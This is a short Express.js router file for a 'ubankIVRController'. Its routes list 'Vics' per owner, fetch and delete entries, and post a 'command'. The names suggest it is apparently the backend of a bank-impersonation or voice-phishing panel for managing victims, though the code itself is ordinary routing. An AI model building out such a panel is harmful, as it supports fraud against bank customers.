const express = require("express");
const {
  getInfo,
  deleteEntry,
  getOwnerVics,
  command,
} = require("../controllers/ubankIVRController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/delete", deleteEntry);
router.post("/command", command);

module.exports = router;
